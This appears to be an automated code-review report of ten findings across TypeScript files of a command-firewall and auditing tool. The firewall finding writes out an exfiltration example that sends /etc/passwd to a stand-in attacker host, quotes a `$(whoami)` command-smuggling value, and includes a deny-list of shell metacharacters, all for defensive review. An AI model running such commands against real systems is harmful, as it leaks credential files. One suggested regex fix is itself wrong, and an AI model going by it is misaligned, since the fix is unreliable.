# HIGH slice 4 — 10 findings across 9 files

## src/hunter/firewall/readonly.ts
- **src/hunter/firewall/readonly.ts:132-139** (security)
  **Security: Narrow block-verb/metacharacter scanner allows command substitution bypass via `echo`**

The block-verb exemption scanner (line 136) and the READ-verb scanner (line 152) both check only 8 characters: `| ; & > < \n $ \``. They are missing `(`, `)`, `{`, `}` which are present in the full `BYPASS_METACHARACTERS` set.

For the READ-verb path, this is low risk because READ verbs can't execute code. But for `echo`, this creates a **security gap**: `echo` is included in `blockVerbExemption` (line 131 via `ECHO_VERB`), so the narrow scanner runs for echo commands — but `echo` is NOT an execution verb; its output goes to stdout.

**Exploit path:** `echo "$(curl http://evil.com/exfil?data=$(cat /etc/passwd))"` — the tokenizer joins the double-quoted string as one token, hiding the `$(...)` from the scanner. Since `$` IS in the narrow set, this specific case IS caught. However, the inconsistency between the narrow scan (missing `(`, `)`) and the full `BYPASS_METACHARACTERS` set means:
- The design intent is unclear — the comment says the narrow set contains "the TRUE SPLITTERS", but `$` and `` ` `` (which are NOT command-splitting characters but command-embedding characters) were explicitly added by F-13 to fix a known bypass.
- The same class of bug (missing characters that enable command execution) could recur if another character is found to be exploitable.

**Recommendation:** Either add `(` and `)` to the narrow set to make it self-consistent, or — more robustly — share a named constant between the narrow and full scanners to prevent drift. The narrow set's comment should also explicitly enumerate WHY each character is included.
  ```existing
  if (blockVerbExemption) {
    // ★ F-13 FIX (2026-09-24): `$` and backtick ride the splitter list — without them
    // ★ `node -e "$(whoami)"` sailed through the exemption as pure argument syntax.
    for (const ch of command) {
      if (ch === '|' || ch === ';' || ch === '&' || ch === '>' || ch === '<' || ch === '\n' || ch === '$' || ch === '`') return ch;
    }
    return null;
  }
  ```
  ```suggested
  // THE NARROW SPLITTER SET — characters that can smuggle a second command
  // or invoke command substitution. Shared between block-verb and READ-verb paths.
  // Maintained as a named constant to prevent drift from BYPASS_METACHARACTERS.
  const NARROW_SPLITTERS: ReadonlySet<string> = new Set([
    '|', ';', '&', '>', '<', '\n', '$', '`', '(', ')',
  ]);

  if (blockVerbExemption) {
    for (cons
  ```

## src/hunter/harness/recon.ts
- **src/hunter/harness/recon.ts:125-128** (bug)
  The `continue` on parse failure silently drops a HUNT_DONE event, losing its sequence number. If that event represented a valid hunt with a high `<seq>` value, the next generated runId could collide with it. Consider at minimum logging the raw value and, if the row has a recognizable prefix pattern even in non-object form (e.g., a string containing the prefix), attempt to extract the sequence from it. Alternatively, fail loud (throw) so the operator investigates the corrupt row rather than silently producing a potentially duplicate runId.
  ```existing
  } catch (e: unknown) {
        console.warn(`[recon] HUNT_DONE payload parse failed — skipped: ${e instanceof Error ? e.message : String(e)}`);
        continue;
      }
  ```

## src/hunter/lexicon/rule-card.ts
- **src/hunter/lexicon/rule-card.ts:164-168** (bug)
  The `isRuleShaped` guard in `readDeclaredMeta` runs BEFORE the declared metadata extraction (lines 165-168), so if a metadata line contains any of the rule-shape keywords (NEVER, MUST, FUCKING, ALWAYS, ABSOLUTELY, BANNED, FORBIDDEN, MANDATORY), the loop breaks prematurely and the classification/severity on that line is silently dropped. For example, a corpus line `severity: ALWAYS` would trigger the guard and exit before the `DECLARED_SEVERITY` regex on line 167 can match it, causing the curated override to be lost and the card to fall back to the mechanical vote. The declared metadata extraction should be attempted BEFORE the rule-shape guard, or the guard should only trigger on lines that are clearly new rules (e.g., lines that contain both a rule keyword AND do not match a declared metadata pattern).
  ```existing
  if (isRuleShaped(line) || isQuotedPassage(line) || isBlockquote(line)) break; // the next rule line ends it
    const cm = line.match(DECLARED_CLASSIFICATION);
    if (cm && !meta.classification) { const v = String(cm[1]).toUpperCase(); if (isClassification(v)) meta.classification = v; }
    const sm = line.match(DECLARED_SEVERITY);
    if (sm && !meta.severity) { const v = String(sm[1]).toUpperCa
  ```
  ```suggested
  const cm = line.match(DECLARED_CLASSIFICATION);
    if (cm && !meta.classification) { const v = String(cm[1]).toUpperCase(); if (isClassification(v)) meta.classification = v; }
    const sm = line.match(DECLARED_SEVERITY);
    if (sm && !meta.severity) { const v = String(sm[1]).toUpperCase(); if (isSeverity(v)) meta.severity = v; }
    // Guard after metadata extraction: a line that matched a decl
  ```

## src/hunter/surface/query-tool.ts
- **src/hunter/surface/query-tool.ts:311-316** (bug)
  The catch block in `codeNameSet` silently swallows ALL errors from the `typed_nodes` query, not just "table not found" errors. If the database is locked, the connection drops, or any other runtime error occurs, the error is swallowed and the function silently returns only `graph_nodes` results. This causes `mustImplement` and `consistency` to produce false positives (reporting MUST_IMPLEMENT / DRIFT for symbols that actually exist in `typed_nodes`). The catch should either re-throw non-schema errors or at minimum log a warning so the silent data loss is observable.
  ```existing
  try {
    for (const r of rowsAs<{ label: string }>(
      db.prepare('SELECT label FROM typed_nodes WHERE superseded_run IS NULL').all(), 'code-names typed')) {
      if (r.label) names.add(r.label);
    }
  } catch { /* typed leg absent on this store — the graph_nodes leg below decides */ }
  ```
  ```suggested
  try {
    for (const r of rowsAs<{ label: string }>(
      db.prepare('SELECT label FROM typed_nodes WHERE superseded_run IS NULL').all(), 'code-names typed')) {
      if (r.label) names.add(r.label);
    }
  } catch (e: unknown) {
    // Only tolerate 'no such table' errors (typed_nodes absent on legacy stores).
    // Any other error (locked DB, connection loss, schema corruption) must not be
  
  ```

## src/hydra/auditor.ts
- **src/hydra/auditor.ts:704-705** (bug)
  DFS bug in cycle enumeration: when a back-edge neighbor (`nb`) is already visited AND on the current path, the code at this line pushes it onto the stack. Since `nb` is already in `localVisited`, the next iteration pops it immediately (line 696 check), but before doing so it processes it: `path.push(nb)` and `onS.add(nb)` are executed, then the subsequent pop does `path.pop()` and `onS.delete(nb)`. This corrupts the DFS state — the `top.it` has already been incremented past this neighbor, so the parent's iteration continues as if nothing happened, but the path/onS are left in an inconsistent state if the immediate pop-and-restore doesn't perfectly unwind (e.g., the node could appear twice on the path for a self-loop back-edge). Additionally, the `path.push`/`path.pop` for an already-visited node is an unnecessary mutation. The correct fix: when `localVisited.has(nb)`, do NOT push onto the stack — the back-edge cycle recording (`cycles.push`) is already correct, but the stack push is not.
  ```existing
  if (!localVisited.has(nb)) stack.push({ id: nb, it: 0 });
            else if (onS.has(nb)) cycles.push([...path.slice(path.indexOf(nb)), nb]);
  ```
- **src/hydra/auditor.ts:884-884** (bug)
  When a grep hit path resolves to a NON-contained absolute path (the `contained` variable is false after the try-catch), the ternary on this line falls through to the `hitPath` value. But `hitPath` was never re-assigned to `firstNodeFile` when containment failed — it retains the raw grep-output path (which could be absolute). This means an absolute or escape-path leaks into the finding's `file` field, violating the containment invariant the comment above describes. Fix: when `!contained`, use `firstNodeFile` as the file path, which the current ternary already intends but doesn't achieve because `hitPath` is not set to `firstNodeFile`.
  ```existing
  const rel = flm && contained ? (path.relative(realResolve(path.resolve(targetRoot)), hitPath) || hitPath) : firstNodeFile;
  ```

## src/kernel/graph-test-target.ts
- **src/kernel/graph-test-target.ts:81-83** (performance)
  The catch block silently swallows batch query failures and falls back to per-label round-trips. If the batch path consistently fails (e.g., schema drift, SQLite version mismatch), every invocation degrades to O(N) DB reads with only a console.warn — no alarm, no metric, no way for callers to detect the regression. Consider surfacing a structured flag (e.g., a `degraded: boolean` property on TestTarget[] or a separate return field) or at minimum incrementing a metric so the degradation is observable in production.
  ```existing
  } catch (e) {
  console.warn(`[graph-test-target] batch degree query failed, falling back to per-label reads: ${e instanceof Error ? e.message : String(e)}`);
}
  ```
  ```suggested
  } catch (e) {
    console.warn(`[graph-test-target] batch degree query failed, falling back to per-label reads: ${e instanceof Error ? e.message : String(e)}`);
    // TODO: increment a metric or set a degraded flag so this regression is observable
  }
  ```

## src/omp/evidence-producer.ts
- **src/omp/evidence-producer.ts:202-206** (bug)
  `laterEditFromGraph` uses `LIKE '%target%'` substring matching without post-filtering results through `touches()` or `containsAtBoundary()`. If `subject.target` is e.g. `"auth"`, the query matches `authentication.ts`, `github.ts`, `authorization.py`, etc. The function then returns the first LIVE row (highest id) which may belong to an entirely unrelated file. This produces a graph-derived edit record for the wrong file — false evidence the oracle treats as real. Compare with `produce()` which correctly applies boundary-aware matching via `touches()`. Suggestion: apply `touches` or `containsAtBoundary(r.file, subject.target)` as a post-filter on query results before emitting.
  ```existing
  const rows = db
      .query(`SELECT file, created_run, superseded_run FROM typed_nodes
              WHERE layer_id = 'structural' AND (file LIKE ?1 ESCAPE '\\' OR label LIKE ?2 ESCAPE '\\')
              ORDER BY id DESC LIMIT 50`)
      .all(`%${escapeLike(subject.target)}%`, `%${escapeLike(subject.target)}%`) as { file: string; created_run: string; superseded_run: string | null }[];
  ```
  ```suggested
  const rows = db
      .query(`SELECT file, created_run, superseded_run FROM typed_nodes
              WHERE layer_id = 'structural' AND (file LIKE ?1 ESCAPE '\\' OR label LIKE ?2 ESCAPE '\\')
              ORDER BY id DESC LIMIT 50`)
      .all(`%${escapeLike(subject.target)}%`, `%${escapeLike(subject.target)}%`) as { file: string; created_run: string; superseded_run: string | null }[];
    for (c
  ```

## src/omp/populate-corbell.ts
- **src/omp/populate-corbell.ts:0-0** (bug)
  The `md` extension is missing its leading dot. Since it appears last in the alternation without a dot prefix, a file whose name merely *ends* in `md` (e.g., `freemd`, `cmd`) will match the regex, causing a false-staleness detection. The fix is to add the dot: `.\.(ts|tsx|mts|cts|js|mjs|cjs|jsx|py|json|yaml|yml|toml|\.md)$`.
  ```existing
  } else if (/(\.(ts|tsx|mts|cts|js|mjs|cjs|jsx|py|json|yaml|yml|toml|md)$/.test(entry.name) && !entry.name.endsWith(".d.ts")) {
  ```

## src/scoping/scope-binding.ts
- **src/scoping/scope-binding.ts:80-82** (bug)
  Stale prefix map entry on re-registration with a different prefix. The early `return existing` on line 79 means the duplicate prefix guard (lines 82–85) is **unreachable** when the same ecosystem re-registers. If a bug or misconfiguration causes the same ecosystem to be registered with a different `wavePrefix`, the old prefix remains in `this.prefixes` pointing to the stale binding, while the new prefix is added on line 88. This causes: (1) `ownerOf` can now match the stale prefix for waves that should belong to the new prefix; (2) `isForeignWave` on the owning binding returns incorrect results; (3) the mutual-exclusivity contract silently breaks. The duplicate prefix check should execute **before** (or independently of) the existing-binding early return.
  ```existing
  register(spec: EcosystemSpec): ScopeBinding {
    const existing = this.bindings.get(spec.ecosystem);
    if (existing) return existing;
  ```
  ```suggested
  register(spec: EcosystemSpec): ScopeBinding {
    // ★ Check for prefix collision BEFORE the idempotency short-circuit —
    //   a same-ecosystem re-registration with a different prefix must not leave
    //   a stale entry in the prefix map.
    const prefixOwner = this.prefixes.get(spec.wavePrefix);
    if (prefixOwner && prefixOwner.ecosystem !== spec.ecosystem) {
      throw new Error(
      
  ```
